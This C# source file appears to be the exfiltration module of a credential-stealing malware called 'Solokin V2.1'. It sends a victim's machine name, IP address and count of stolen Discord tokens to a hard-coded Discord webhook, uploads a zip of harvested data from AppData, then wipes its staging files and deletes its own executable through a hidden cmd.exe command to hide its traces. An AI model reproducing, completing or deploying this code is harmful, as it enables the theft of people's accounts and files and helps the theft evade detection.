using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Solokin_V2._1
{
    public class Send
    {
        public static async void Send2()
        {
          

         
                string webhookUrl = "https://discord.com/api/webhooks/1104384608360988702/XdfbCW0Z67qM-4YXLwtI01nkwTkzDbIILg9yYljXsF14LNw0YMRGnTlHhu0oqGV4ry5D";


                string TokenCount = Counting.Discord.ToString();

            var payload = new Dictionary<string, object>
        {
            {"content", "@everyone"},
            {"avatar_url", "https://lezebre.lu/images/detailed/15/21624-trollface-meme-crazy.png"},
            {"username", "Solokin V2.1"},
            {"embeds", new List<object>
                {
                    new Dictionary<string, object>
                    {
                        {"title", $"{Environment.UserDomainName}"},
                        {"description", $"```[+] IP: {Ip.IP} \n[+] Wokring Discord Tokens: {TokenCount}```"},
                        {"color", 0}
                    }
                }
            }
        };


            var httpClient = new HttpClient();
            var request = new HttpRequestMessage(HttpMethod.Post, webhookUrl)
            {
                Content = new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(payload), System.Text.Encoding.UTF8, "application/json")
            };

            var response = await httpClient.SendAsync(request);
           
       

            // Set the JSON payload for the webhook message

        }
        public static void Send3()
        {
            string Webhook_link = "https://discord.com/api/webhooks/1104384608360988702/XdfbCW0Z67qM-4YXLwtI01nkwTkzDbIILg9yYljXsF14LNw0YMRGnTlHhu0oqGV4ry5D";
            string FilePath = Program.AppData+"\\"+$"{ Environment.UserDomainName}"+".zip";
            string AvatarUrl = "https://lezebre.lu/images/detailed/15/21624-trollface-meme-crazy.png";
            string Username = "Solokin V2.1";




            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", $"Solokin.zip");

                // Create a JSON object with the avatar_url parameter
                var json = new JObject();
                json["avatar_url"] = AvatarUrl;
                json["username"] = Username;

                // Add the JSON object to the content parameter of the webhook message
                form.Add(new StringContent(json.ToString(), Encoding.UTF8, "application/json"), "payload_json");

                httpClient.PostAsync(Webhook_link, form).Wait();
                httpClient.Dispose();
            }

            Thread.Sleep(3000);
            Delete();
        }

        private static void Delete()
        {
            if (Directory.Exists(Program.AppData + "\\" + $"{ Environment.UserDomainName}"))
            {
                Directory.Delete(Program.AppData + "\\" + $"{ Environment.UserDomainName}", true);
            }
            if (File.Exists(Program.AppData + "\\" + $"{ Environment.UserDomainName}" + ".zip"))
            {
                File.Delete(Program.AppData + "\\" + $"{ Environment.UserDomainName}" + ".zip");
            }

            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            // Create a new process to delete the file
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });


            Environment.Exit(0);

        }


    }
}
